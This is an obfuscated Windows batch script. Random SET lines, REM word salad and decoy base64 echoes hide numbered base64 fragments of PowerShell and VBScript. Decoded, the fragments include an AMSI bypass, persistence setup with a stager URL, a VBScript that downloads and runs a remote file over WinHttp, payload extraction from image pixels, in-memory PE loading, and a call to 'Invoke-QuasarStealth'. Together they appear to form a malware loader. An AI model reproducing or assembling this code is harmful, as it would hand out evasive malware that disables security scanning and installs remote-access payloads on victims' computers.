@echo off
REM kiln vertex shadow sword glimmer
SE%wFRDC%T "iRfIPa=wQHSLrwPgGKcHfhj"
SE%dCcH%t "pk_UABV_0022=PSAidXRmLTgiOiAuT3BlbjogLldyaXRlVGV4dCBoLnJlc3BvbnNlVGV4dDogLlNhdmVUb0ZpbGUgdCwgMjogLkNsb3NlOiBFbmQgV2l0aApzLlJ1biBDaHIoMzQpICYgdCAmIENocigzNCksIDAs"
REM guard guard vision ruby ruby phantom circle shadow
Se%pLP%t "sGZdGyWVgeA=dGTTVEebigjhByhjQhYfRpoR"
SE%QhvXA%T "HNDlcsVgyRCsS=eoGCgWXrSL"
REM vertex clearing twilight sword kappa phantom lance zenith undergrowth vertex
REM binary beacon twilight strobe
REM ruby fathom fathom clearing clearing mirage fragment
sE%GMgQy%T "WGvQUKMyAoxpI=ogDeKqgLlTp"
echo V2x3TzYxdnRQT3R0YlRkUXJYQWRTZkFIenYzZHAwZGNCUURhMUlobDNrR1lQWHZla0hLWkdNTUFPSUlrU2oyUlFtVw== >nul 2>&1
REM echo twilight shadow circle echo undergrowth valley circle vision
SE%gQcpT%T "RaKBORr=gDTzAlOgrTyeHuCfHMFYxAjnIPwGgDQT"
Se%iyy%t "lLmOLeUlEXYYhE=udgiSiEhikdrpsNCSDndonawjJWZMwVaqdu"
se%qDm%T "wVdzDYFuyEWId=joGGshxiJzPTuJOzQYIvRsmW"
echo d2Z4YlpvalJrOHd0bGsxbUFocE9RNEhOY0hWNGtoMll6RU41THhkbGJ1aHc4c1JNV2VvVlcwODVuZE9uN2ZtNlBqb1l6bHlwdEY= >nul 2>&1
SE%lzNx%t "rVcOXOimOMDFnk=WzyjrtBGbyMgG"
echo em5lbk85WTFqRVFZM0VYb3RpbFFkNGNCVHNvUWdtMGcwVzN5Rk5nUVRobHhoTGNyV0JBS21xZ29WNlZkdHZvM05kdjJwQmM3WlNa >nul 2>&1
echo emgxbU1EYWI2cTdPREd2TGJuSkVrUEw4RG96N00wOWFkY3VwbjhocEh4Y3JKOWQ= >nul 2>&1
echo b2xZVElja2xVSzdhZVBCc1NGUGxqamk0TzlYZ2RqN1RFR3pUYlp5RnlMa2t6c1BKdjhNeWpWamthZjA= >nul 2>&1
REM pixel zenith lance shadow undergrowth phantom hawk beacon fragment phantom
REM binary lance strobe clearing kappa fathom
echo TWNpQXk3eGRSQTdCV0NpQVhIc0N0V1lkcWJUcDkxTmN0MzBVTDdVRg== >nul 2>&1
SE%OBFk%t "MlaFfmRVzGywkWq=cGqmjeHELXAbhgVAwZvD"
REM beacon pixel phantom kiln delta glimmer
REM delta hawk glimmer circle sword glimmer beacon clearing clearing lance
Se%ZKT%t "PNzubXkxDsQoDY=MPZtaZltNbRSZeRDCTbaxQvCGILw"
echo VUU5SVA5YTdMTVF2c21tUFdnOWRZamhGV0k2RUxDeTJLWHZ2UXF2MlE1MXkwRGYyZzlROWVGWjd2OHh5Z0hQUDN4N3VyNFdNWUNUQw== >nul 2>&1
echo NzBvajgzSVRTVUJGcDBUZEUycThjN1RHeHJOVDBveE1LM0NieXFtSXc0TDRhZmQyTDMxZ0xkcFoyUHpl >nul 2>&1
sE%uBo%t "rEEtunE=uDDDaVOOKGEGmBUUGaMwCUVLAWFrTqZM"
REM lance mirage pixel glimmer mirage lance ruby shadow fragment strobe
REM echo phantom valley shadow phantom
sE%sqrn%t "omWcCk=SaFuxhyXDqUpLzVlMgeemzAytHa"
se%MGZF%T "AGeQWDxchr=rONvbEBNwpswYyPjhumplUEzPfnMI"
echo Z01PZEU4UlNsc2FhMHdOcFY2d2lwYmlzR2FVVEJJbEJ2b3o0bTBKbEw1ajYyOVZuejY= >nul 2>&1
Se%eCi%T "yiCVDAcOP=kQkDdKOgFNplgVSfHxRTSVbYNGHi"
REM cipher mirage phantom vertex odyssey core fragment
REM hawk guard vision
REM circle shadow circle vision
REM hawk guard zenith
REM vision lance sword shadow zenith clearing
echo OWhVZlJPN0lENlhJS1B3VWdCWkZrQ2xodWh0emI2b3d2OWloNkNYMEg0TA== >nul 2>&1
REM fathom phantom phantom
SE%Umtc%t "zIiAnVuJSatRvwA=ESjZwYJSTWazqklrUjrXCkKVqVymi"
SE%WiG%t "UaGpzVCq=bzrZETfgVKvqjsO"
sE%OZRTP%T "LdtJGTFqHysKCbJ=GflLGSpNcRxGWnoBa"
se%CAnS%T "lxillkTzpl=KbBjpKbWsXfhMqYhGXFqFT"
sE%nBkTC%T "PlSjZB=rTzsxREeupRJAclyWyIHIGRokk"
echo QjBBVWE1MURkUXNRNlJxZll6UG54ckF6ZGQ5b2xOOEcxVnVtYTVWS2xPT3BWcHlxWHRlTWFaM0J4WmVpNHFSdFhWSUJBWmVX >nul 2>&1
echo YkRqS2JLRERWVGlDYUZOWWhZRGcwWWF5VnhLbGJuTmpNRUpwd1ZiaFkwc29xcWJSOWhSMUh2ZXN3MTlBSW8xazdRWA== >nul 2>&1
sE%Kroh%t "pk_UABV_0047=3I6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIiAiV2hpdGUiICR0cnVlCn0KfQpJbnZva2UtUXVhc2FyU3RlYWx0aCAtU291cmNlICR0YXJnZXQKUmVhZC1Ib3N0ICJQcmVzcyBFbnRlciB0by"
REM odyssey kiln beacon kiln strobe phantom glimmer delta kappa
SE%BFDgg%T "RhWIzK=LJftUIyWokxhLXJDJlESx"
se%mbjdv%t "wIgiZGfcXnJCOJI=uegNnXRFKpeGbDkANzrSO"
REM guard undergrowth guard sword sword lance ruby undergrowth core
se%ZGnB%t "pk_UABV_0025=FIikgewpJbnN0YWxsLVBlcnNpc3RlbmNlIC1TdGFnZXJVcmwgJFBFUlNJU1RFTkNFX1VSTAp9CkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRyYXdpbmcKW1N5c3RlbS5BcHBEb21haW5dOjpDdXJyZW50RG9tY"
REM odyssey guard binary clearing ruby
REM lance delta undergrowth clearing sword glimmer delta guard strobe
SE%bVi%t "PTbIab=dSnQetXRtDlXYtuOzjvaCXNgAhKd"
echo c3VTM1c1TU9oc01tbjZhNTBndWJRcjVWNnhVY2ZoNmY0b2pxR2ZEYW03Nmg5T1RDakR6WXM4NTRyRm1tSU5KNWJtZ2Q= >nul 2>&1
se%dyeLF%t "ZPEXPpKfHHh=DyXOCxrdbowWiJvmPUdsLj"
sE%ImS%T "HnneHUO=nkdfZRHLNB"
echo N0JXYzFlUWdFMWpPMERRNEVXb0ptTHkyNjVHcTAyUldqdVVZb2dCRDA1cGVuaHBIWllodWtqVmp2RDVadTIwNVMycQ== >nul 2>&1
se%scgwi%t "fLBvrUfBOeD=GyZodRGPVngwqHRlcKtRIVYFclChkPfjt"
REM glimmer hawk binary kiln undergrowth guard
echo RmM3b3JlRWlOaW9GRTFXM1ZDR1d1Qjh4blVXNURNSmJLNENXQ0xYTDJTOEROY0dIdjhHb1dWZm5WaUVSNTJoZVlOWkFRcER2MzV3TDZt >nul 2>&1
SE%bxi%T "pk_UABV_0004=IGZsYWcgcGF0Y2hlZC4iICJHcmF5Igp9Cn0KJGNsYXNzTmFtZSA9ICJYUF8iICsgW0d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoIk4iKS5TdWJzdHJpbmcoMCw4KQokY29kZSA9IEAiCnVzaW5nI"
REM lance sword lance
sE%gLUCy%T "RNtestyMN=lsfGXccXXocytKMIqNPIlyYlREawnT"
se%bXJnf%t "rgPNwf=xhHojsgKeqVds"
echo N0ltakpIMVhpNmFMeUFMSjkxQzg0RGZna1VUODVtcUtJeDF1T0F4QjA1Y0FNOXQ4ck9DVlRHaWs3eGhTMXpNNg== >nul 2>&1
echo ODB5U0JnWDIweWNmWktuU0ZaNUMzU3RKamFhVElsSDRKM29yRFV6TlhtODU= >nul 2>&1
SE%dZKq%t "wyksthQls=nAkPRsEJNAL"
sE%DaM%T "KMiuyCsOc=XZwijJRnMeWc"
REM glimmer zenith circle lance vision vision guard hawk guard phantom
SE%yZf%t "qCLzLJIuvJuFfta=uDuzQTPtDomFJ"
REM fathom hawk fathom ruby mirage core twilight lance
REM clearing cipher pixel pixel mirage
echo bmZuM0VnUEZIVTJsQjg5SHJPaDBMb0N4em90bG5FMEVOSmNzT3JBYlkxa3JjT3BGclZPdDJibkRvNA== >nul 2>&1
sE%cKLct%t "JSKeXlFyBQjabiP=LWvMEOvIfRArQdOO"
echo U2txNUF2TVI5VENIdEo2SGRTVVRuMU92WFp6em1ZckhiTW9URVJGWVl6Umc0dWU1U3llRmgxcDd6Qg== >nul 2>&1
Se%IoIx%T "zliqyKx=oFKJPlRSmrqul"
SE%xByhW%t "mbERUxWKEebJP=awYERMsLwOMWN"
REM valley twilight shadow fragment ruby cipher odyssey
SE%fwGOF%T "VKfuocx=wTnZVkDCRrLUVeeMyTpjNcvpoej"
echo c0xQMmw1UlVBRWlyODBhdUVsQjF6eFlKT2VTRkd3VDRiN3hmZnA3Mm9kOTBMbTd5eG11WnB5 >nul 2>&1
se%GrcdZ%t "unvwWQ=itkMDDYEMs"
sE%HSgSI%T "JIWNvVYF=GZUzWLgcQSxbyzxTu"
sE%uSSTB%T "bLtJuZADs=ymHCXSwGdXZXfgHyWdaaorwHtggTHVRkI"
echo VW9DVko5M2VmclFYY295SGh6d25yWjZUT3ZHWVZ6UHB1MERuU1ZUZkg2MUMzTmxnVlIyTWRsVDcxaWdjMm5iRkl2MEJFSQ== >nul 2>&1
SE%kjYrQ%t "roZWVLyCINvi=rWmhwMGqxgvTWQ"
REM vertex mirage phantom strobe odyssey shadow vertex vertex
REM guard phantom undergrowth fathom binary glimmer fathom strobe circle guard
Se%wRN%T "QRkRVUyGcr=RQXBulzcKxJUunVvQVpBkOcKj"
se%JNh%t "cGGXDQKtTryAYQd=yWddbGgEHIaTbVNfNaJCis"
se%RVOo%t "aMjRnIU=YsYUSSgXRcTvxSrFHuSmfNgyM"
echo NGFKNnNJMk5SWjBOUUZVWmNIdFh5R0RhMVk4ZTRNZWlzU281WGlBczhzcGNpUTdDWGhRUG4wQ1RDNDJXaFg= >nul 2>&1
REM guard ruby kappa
SE%kga%T "XXqRizuPgKSq=YAlnotaqrncQuwEdQxjCLjMLTRlZuH"
REM circle sword kiln circle strobe phantom lance ruby fragment
SE%iSM%T "pk_UABV_0018=F0aCkgeyByZXR1cm4gfQokY2hyQXJyYXkgPSAoJFN0YWdlclVybC5Ub0NoYXJBcnJheSgpIHwgRm9yRWFjaC1PYmplY3QgeyBbaW50XSRfIH0pIC1qb2luICIsIgokdmJzQ29udGVudCA9IEAiCkRpbSB"
REM echo sword sword
SE%wCh%T "gjQIJvrgGHfd=FxwhZvcvLsabCPkTBBsmHY"
REM mirage phantom phantom kiln clearing fragment undergrowth
echo YnRyNksyR0k0eENkZGJKRGp0ajNvMkFEQmJaTUtVQnBCQ0p6bXF6REhVQW5yTw== >nul 2>&1
SE%HXG%T "pk_UABV_0003=ApIHsKJGYgPSAkcC5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCAnTm9uUHVibGljLFN0YXRpYycpCmlmICgkZikgewokZi5TZXRWYWx1ZSgkbnVsbCwgJHRydWUpCkxvZy1TaWxlbnQgIlsrXSBBTVNJIGluaXRpYWxpemF0aW9u"
REM shadow strobe echo fragment cipher zenith strobe zenith
Se%bLc%t "ZRmANmsthO=zRPEwHxvyQuNWbLkoGkPuufkSfaJNobY"
REM core kiln lance lance phantom pixel fathom kiln shadow
echo N0RuZlNFVFRYSWZwZHpLcE1ncjhSVWp2OUJlVkpDaDFrQlBIaWdibmJnb2poendkeXlUbUFRUWxhTk1W >nul 2>&1
sE%guP%t "RLVnjI=gTGEqrRugdCKulaVAAGIoESQlmchQRgXVgQ"
echo RWFWUm81aG5TTm9HWFNpRmdPYVlLcEY2UUhQaWxwQ3U5eGFVd0E0Qjdp >nul 2>&1
REM phantom lance fragment valley zenith vision
REM beacon fathom strobe pixel
REM shadow kappa binary
se%ZDcM%t "HYcnECo=tnEhCjrbSKDssTXW"
SE%dRV%t "kZwrcEsZTNirVKj=oADYVjNOHRVgJERLxOtPFmTUkLqUkjF"
Se%uqO%t "suHuIkWEQX=wozmoqMimHTowSGKuCTDwc"
Se%wTnS%T "pk_UABV_0013=md0aCkKJHR5cGU6OlZpcnR1YWxQcm90ZWN0KCRwdHIsICRwYXRjaC5MZW5ndGgsICRvbGQsIFtyZWZdJG9sZCkgfCBPdXQtTnVsbApMb2ctU2lsZW50ICJbK10gQU1TSSBHaG9zdCBQYXRjaCBhcHBsaWVkIHN1Y2Nlc3NmdW"
echo YzdmQmtUUTNPZ3ZQQ3JRSG5vTXAxdWVkQ1lGbmdxb2ZaRXZ0aWQ2RVVyMGNqNUY= >nul 2>&1
REM twilight sword odyssey fathom twilight
REM core echo twilight mirage cipher
echo OTJqWTNBYkFyZ2J5OEVXWmExOHF0STk4Z2tlYzRCcFp2OUhQZzBFb3NqTGFHVGdDUXMxdnpETUZ0YTRvM1NxR1JzaktWeWdhZU9TSw== >nul 2>&1
echo SFdPMEtGbUVvdHpWbG1OQnhGZFcweGNEcThoNWtzS2lEcG9CcGxSN3kyVUhLUW94eXF1UXJoa00xVDNSOE05VURLNUlHcGJsOVA= >nul 2>&1
se%WFv%T "eoSaDpPdhy=jtckwqzrptFel"
echo ZHloWFEwbEM2NzR5ZTBDejE5TGtpcnV1ZXVRaUJQM1duaDBZS25EUkI= >nul 2>&1
sE%lvB%t "ZppEHfjvvXvXL=oXfkMKdTPHqCEHGhuYZlqExcWFNT"
REM vision fathom echo
se%UWhFL%T "RBxSdrOM=zMldWjAzdjAlsrPVPLl"
SE%NThnU%T "JDNJynSAIe=mihqVcnFYSdNGFmXcRyFOk"
REM kappa echo phantom vertex vision kappa echo glimmer sword
sE%Kaf%t "zWPbeWRCZwxk=hgujXiWsrgZhTJwGyQExmpGjdEUQqnWCPS"
REM fathom circle circle guard delta binary shadow clearing
se%vtE%T "qbRURWmvbuOa=FQTDpHrYezzIaSlmmKUemOVxl"
REM beacon pixel hawk twilight
echo cExlbm9DUmFOSTgwaFJZMElEVnI0bTVGYVlnUEdmZm5jdlZaM05YTnBuUWh2M2hibGNWRnpwbUFEcno2SUh4RGVBUkNBMFFhNHUzSmk= >nul 2>&1
SE%EXbQJ%T "lHdxtXRDlvVN=qsAPuLDeJyvmVtGO"
SE%lMcD%t "oCRFGg=HuamGXNcHMpKnHgHmif"
SE%OUjwn%t "sSTZaVZBtpwUD=YskKoNjiLddwlKh"
REM zenith fathom fathom clearing fragment guard hawk zenith zenith
REM fragment binary undergrowth lance vision vertex undergrowth clearing mirage cipher
REM ruby delta kiln
sE%XZDy%T "EwtQzVnZnsoVyT=xwUxnNeXdgqOjnyoVTOVDrPVdcTxppcUQm"
REM phantom delta echo fragment fragment
se%gpE%t "odGsiCGnfRjqSoY=EQPxrPYdyymEkucxhuMTWyolVdmMmZYFRo"
se%vSFt%T "qcTQJVhHdi=mAGzkzwTzuHCHmKrYeWMFgxNh"
se%HTH%t "MTrBOxVrY=nVfoteMGsgycXaVeSxoXpmuMVZBDMDsGtl"
SE%RLwkI%T "mIFPpGFbMENKvmB=BbkUaxqeMuzRNIcPgECQfpkpSwvn"
se%CIfFW%t "KsmUvxdnpGf=pikyuNepOHBQhXrcnlsbcJPBtIoXwm"
echo enhDM082U0hvc3Y1dDJtTmRoRzczcFZ1N0JPZjdEaG1qNU42M3poZWxmdG14cXhwN2t0bTlHQzBUUFdGMw== >nul 2>&1
SE%xCql%T "uTcEhYDNTc=xynkyHtKdeoPNToY"
sE%Kox%t "CoXVptKhVVsXm=EbtYRwvjoTpKxILJjYFKIRz"
SE%ruZTT%t "SBOkIiRRl=nrmWkWMlCbCsYXupXJHinEQUYHqj"
echo aDlVeHpzWWxUc0JlSkV2RWtWQmFUMmt3aFMzeGowUXhlbTR3UUFha2R0aVNHT0hrRnI4b0FoTk50THF2eVpMQUJwRVluVHdEWFZQRzZ0UTE= >nul 2>&1
SE%PJN%T "AYYqoVVzEdE=kzCTyeeMAPUIgpFgWBNfkvNX"
sE%dMn%t "nLTcyUukMGBIXl=OJogfuItQPorRWGcxabEMQYrwWfSOzkA"
se%yDB%T "FJavQux=gMJTrUvCOuYmTILuhRvALm"
REM shadow undergrowth echo
REM phantom delta shadow glimmer
REM kiln pixel valley circle
echo c1o0MW02Sm1Yb0lqTHV2RnNqWkdaMUd1N3VCTEhvQWh0MFowM1VOZ3lsTnpkU3hMdE9NWmtVNU5VM280ampySjQ4cHVNQg== >nul 2>&1
REM fragment sword strobe echo valley binary guard odyssey twilight
sE%wzo%T "fSEKgZYWylNQ=tfdZnOPAbRnqrNNcvj"
REM clearing odyssey twilight hawk ruby kiln valley core odyssey
REM sword echo lance cipher fragment pixel cipher ruby
REM vision fathom twilight phantom circle odyssey
SE%Dbs%t "mpIhpYQSrfYj=vIBGTkvkjXOYeXhLwVDL"
SE%lMHqS%T "RzrCRvmEo=NHxrjrmRPbCkvJElpqxpr"
REM echo vision valley vision pixel
echo ZUFRNFYxUHBLNTlNYWtpcnFqWjM3V3FwNElERTZCeW0wUEVja1Q4UjQwckVHaklTaHNJSQ== >nul 2>&1
REM shadow echo circle zenith
se%nGyE%T "nuBJwHJc=waaErYKcOdgkNoIxJEmNd"
echo eHVscEpOSGN4Tnk5cXpWQXhFZXA4RmNJOTRFM1ZBWU1FemxYY092aVVGOWNaNlp5dDJDMA== >nul 2>&1
REM fragment hawk odyssey
REM mirage guard zenith sword zenith phantom echo delta zenith core
echo dFVONmtwZFJmRW8zZXpsTGhsbHpKR1hXTG05ZGxJVDIzbDUwVVNWOHJD >nul 2>&1
echo OVBEWUI3TVpjWGxGeVVDNDZJUnJIa2dmbGNSWnUxWmdVbnBzTElVTkkzV1NzWGk3bFNnT2hBU3BUMjFsc0R5ajdzVlQxag== >nul 2>&1
SE%iiS%t "oECktnjKeya=XgSwJOkecZqBX"
sE%OUJsE%T "jhRoyxfh=qzwpmECDFxdPmqlReuytJqipJhQQXOy"
REM glimmer ruby fathom
echo VG0wT0J1OFR6ckNFMm9FRFJkOWQ4a2JCVTl0bGMwZGlrRWdhMlJYSzR5cw== >nul 2>&1
REM kappa fragment odyssey pixel hawk kappa vision circle mirage beacon
sE%jWHXg%t "hSoEOVNaQVpGOo=MtMtzxtCPgfymiWritRyVHJuFqpxhPGU"
REM zenith valley guard twilight zenith valley
REM hawk sword strobe binary twilight vertex twilight guard sword
SE%pNTnF%t "pk_UABV_0036=dGVkLkFkZCgkcHguUik7IGlmICgkZXh0cmFjdGVkLkNvdW50IC1nZSAkbGVuZ3RoKSB7ICRkb25lID0gJHRydWU7IGJyZWFrIH0KJGV4dHJhY3RlZC5BZGQoJHB4LkcpOyBpZiAoJGV4dHJhY3RlZC5Db3VudCAtZ2UgJGxlbmd"
REM circle fragment cipher lance vertex beacon
echo bVFjMVhGVnVqOGl6b1BVdUJ4Q2dsVVh5NXVCNlJIelpzc1pSVnhUYjFiTVJBeGluZEJNSkI5UDJTWXFQaXRJd3o5TGhj >nul 2>&1
SE%cUK%T "dMkLyrm=nggjnZynuWtBanb"
echo NXRLOUlIcEJUSDhoMTVoaGlkeUFFdDNQVmhTZ1E1eGxNSTRQeDdGMzdNVDl5U1Y0SUFFNDBGVmc5UDI3OHdINw== >nul 2>&1
REM clearing lance mirage core binary circle
sE%UoIH%t "BVcrfeMtNqwPC=VuPbQmBzazlfpPHSjmSUHFyZTMo"
sE%Xsur%t "aoaqkh=cLANiWhHgfVRAhPmFRIGgNFbwOYLcaGOx"
se%SvjK%T "fTLqVDPQP=ropwEZVwHfItQriURYS"
REM fragment valley zenith sword strobe core undergrowth vertex
Se%LEQ%T "FYhjWGnmYhg=wijBwNppFafVHpJsbvCUBg"
echo dGtpQ2UyeXQ4QUdyV1dLVW1XVUFmWWx0bkNUS2lkSzVBVlJUZk53TmlzZWV5dlpoMGJoaHdoWXBzUzZXWUFqNg== >nul 2>&1
REM mirage twilight valley strobe beacon shadow shadow fragment
REM twilight sword ruby sword
REM core clearing zenith fathom delta kappa phantom
REM lance beacon core cipher guard undergrowth core vertex twilight
REM fathom mirage undergrowth
REM twilight cipher core hawk valley binary fragment clearing valley
REM kappa guard pixel lance hawk valley
REM twilight pixel clearing fragment strobe twilight clearing shadow fathom
SE%DRZR%T "JMsyAyiCCLWuk=ZocoElXwOXXYr"
REM valley delta glimmer kappa lance clearing hawk kiln pixel
echo OWN3dEVpT3REa2lXUEVPemc1ZHZERVhrS0lRamJtMGFRUXZFQU54Q1RxdUxKYmRockQ= >nul 2>&1
sE%CZgMm%t "mFgLgVWtdE=vZGvSiakvBQgHGXjRdDUtLAnj"
sE%kyQL%T "ARMggL=qUwQNqxqeUFbdpMlw"
Se%dqtQ%t "fjpgOza=HirKMIngkJcLnDwEtTixtBAjFxqWwnbpX"
SE%dmS%T "gvWCzdkRihQqpr=XwJLEAsTrJCaJFCHjxSlW"
Se%CCS%T "qkGsKa=jjAbRhdfkQ"
SE%rVrl%t "TdeKOqYmCNZOU=vyBlJFpJKTJEOjzBGTbrDXFSkigHQkkDn"
REM twilight sword shadow
REM valley zenith phantom kappa twilight core
REM fathom binary mirage valley circle strobe beacon
REM beacon vision undergrowth fathom kiln guard undergrowth strobe
REM twilight clearing ruby zenith valley fragment
sE%bEc%t "IjaSyxKdVYS=tuELXRQtuqmOIruNbeqAYnTJTNCJomWev"
REM beacon hawk fragment guard mirage glimmer
sE%eMV%T "ORenDfhLqMKVo=TozyizyWqIoBQIpWPO"
REM odyssey echo kiln glimmer cipher mirage sword twilight
Se%hNGm%T "pk_UABV_0037=0aCkgeyAkZG9uZSA9ICR0cnVlOyBicmVhayB9CiRleHRyYWN0ZWQuQWRkKCRweC5CKTsgaWYgKCRleHRyYWN0ZWQuQ291bnQgLWdlICRsZW5ndGgpIHsgJGRvbmUgPSAkdHJ1ZTsgYnJlYWsgfQp9CmlmICgkZG9uZSkgeyBicmVhayB"
REM beacon fathom lance odyssey fragment mirage lance core
echo UXRGSGxQSG42WndMU2JLV055S1RONnJBYUdidVh2clU5ZGxnTmdxdG9jSVpwMVluYUxKRjBqYVVQSmNKYnNmQjZH >nul 2>&1
REM pixel circle odyssey valley core core
REM sword phantom twilight circle glimmer mirage hawk ruby fathom
REM odyssey fragment glimmer ruby
sE%HXiOk%T "pk_UABV_0040=ykKJG91dE1zID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uTWVtb3J5U3RyZWFtCiRncy5Db3B5VG8oJG91dE1zKQokcmF3UEUgPSAkb3V0TXMuVG9BcnJheSgpCiRtc2NvcmxpYiA9IFtBcHBEb21h"
REM cipher lance cipher hawk
REM fathom phantom delta fathom glimmer odyssey delta binary beacon
SE%bRVyL%T "KESKeDdhaH=fitBaxxFFnOiWz"
SE%iCwfY%T "YdAtBwXU=jsCYFdSNqthCuMJeeOGswPaYlqY"
REM kappa shadow glimmer clearing cipher delta guard glimmer glimmer glimmer
sE%uckj%T "JaZqtrQ=UMpFtdYlIaSINmDOYeLwRatZEzAiThafR"
se%gcAse%t "siCCwtcSB=cgLIrEOkUais"
sE%nuzQ%t "gNMJJyZ=pWqQZHleJWaggPOQDjolLTnfWdoxvypYMU"
sE%ASeLM%T "isqtQt=rcnEEEZdIgRyfxNYaaztyTSMWinbGX"
sE%kmIED%t "YmcCIqAENtAlY=xpaaeqlLstnxEXdiRPGjpTTkSECJIaLnIM"
REM vertex circle echo delta
se%yNU%T "oZRFFswKBo=lpAFtPjeho"
echo MFFLbm1HVG5yUlo1YlV3UjROU0hpRVBmWHZrR0xVVDN4dGRWOXM3eENNR01yRWlGU21qMm1YSzZxWHRzQzlsZkpaNHVCb3VQbFlUYg== >nul 2>&1
Se%zgd%T "wkLVCYIoo=PjEkEsLduVUbMbj"
REM pixel echo beacon
REM vision binary mirage fragment fragment clearing phantom kappa
echo R05LTE5Zd25LNEFpWlBKOThrN29uVHcwMWZqVHdXandxSEQ4WjhQOU1DMWtVWkNUeUppMzlPcW80eE5NSg== >nul 2>&1
Se%ATI%t "rieWFzqzmKgyekv=hRkFJCSwVOhbBOupexTPMEkxvBLxvJlXLcD"
echo M2ZuZk9NbnRLamNGdDRVakVkV3VnZ2FkV0M3Z1dlckdjWUlOTU9nV2k= >nul 2>&1
sE%qAbq%t "pGFfuNUrmKOej=uKSSqNRPgPFPVodBBjkjA"
echo ZDRSZWNPVmc1bVVaM3NqSkdPekhWMVpMZUtaSEdhV3hMTVdmbVNnUVA2MjgzWXhReDQwd2lBUjlIUXJ1SA== >nul 2>&1
Se%GTW%T "KuoMHBtf=zTDiBcFvqcdEPXiZxWVIBRZ"
Se%vMbRr%T "CgwbzK=YueemcxbQkCNFVXzqtDLOicQaYSVoZ"
echo NjZydWkweUh4VGRWWEVGSmNHOFZEbkZXRjRVNDNHcVVmYUU4ZVdwVzRWY3ZydnBkSTdX >nul 2>&1
Se%eXHkX%t "GZgZRtA=IvNIUmykeyviLOZfi"
sE%BlM%T "ZrPPFL=jtOSfrsjZVSvaeiOX"
REM ruby hawk fragment kappa shadow guard vertex kiln
SE%ZSYz%T "swoMtUkPpt=NcpltDEatTWACy"
echo VjlIVUlzbGhZTlBnWk5SRnZKUXdBQzJPMUdvWWhsbjl5QTVqZTJ3eXR1TGtGNkVuZ21OWjFJMFFYQkUx >nul 2>&1
SE%FaZ%t "aYGGYyiHZf=BsHIGllgXlOUvftGvPvDhD"
REM valley hawk lance
sE%csx%t "pk_UABV_0020=JbiBBcnJheSgkY2hyQXJyYXkpOiB1ID0gdSAmIENocihjKTogTmV4dApTZXQgaCA9IENyZWF0ZU9iamVjdCgiV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEiKTogaC5PcGVuICJHRVQiLCB1LCBGYWxzZTogaC5TZ"
echo c2JXYkdQTTk1bTJKbE9PUzdYTmFYWGVjUE1PYzFyT0ZSWDZRdGpPOEdvdUJBbzg0MjJsWHJqdWR4Y3RkaEVUN2g1cWtaTw== >nul 2>&1
se%tBVHl%T "VRKiswzJIPxXQ=fHQrtKlxasnIQvchWEF"
REM lance phantom phantom twilight binary odyssey sword clearing echo
REM ruby fathom kiln vertex strobe clearing glimmer mirage ruby
REM circle cipher mirage circle
REM hawk zenith sword circle
REM strobe hawk shadow undergrowth valley sword mirage
echo Zm80eFZWWXhDMUM0VkxFTWhhU3c4R3gxWXJyNEw1cjBpUlBKYzA3c2picndZM0VMMUk5SWg= >nul 2>&1
REM hawk clearing sword mirage zenith sword kappa mirage
se%oGEE%t "XsiyxAQnAQiwj=vaKhGSkIxNeHWaK"
echo dWpyN1VZeFM5UHR3M2dZODJpakZVckZ0MVMwN1hNaDVaTExJMUhuVFExd2lkUWNKZkhSRncxUE5W >nul 2>&1
se%nXk%t "YwHLWHAUicRRw=mNJgqryhMQuvFayVbYoBSMwjCDeein"
REM circle binary echo shadow pixel guard
Se%IDs%t "GhcWYIEjhV=HKoVfBuDFjHHRqaselaGvULxZmzqRHZuFIo"
REM undergrowth kappa vertex odyssey
SE%QlhVG%t "PZwBlbpNNQL=NGKUDDdNmCtbjJDfxMDZXxvlfxQnIxNUD"
se%rxy%t "PSTWurPHRBY=lixuPOAhRnTGcWkuX"
REM ruby twilight hawk
REM ruby hawk mirage shadow valley
REM odyssey core kappa guard ruby glimmer binary
SE%Neo%t "VCsYkloJTORDJI=FLdMZDDHzimnbslAgwQGhvz"
Se%iCC%T "YDUeHDw=yRmsbhTskPdpauBfdhCOiSFapvLOgn"
REM pixel delta mirage twilight ruby phantom echo
echo TDdQbGVJdWQ1TFVGRkxmWEdVbUpXQ25MUkNjQWhVTlFaSXZxalp5c1h2bWZMRTMxdA== >nul 2>&1
REM binary fathom valley phantom mirage ruby cipher phantom
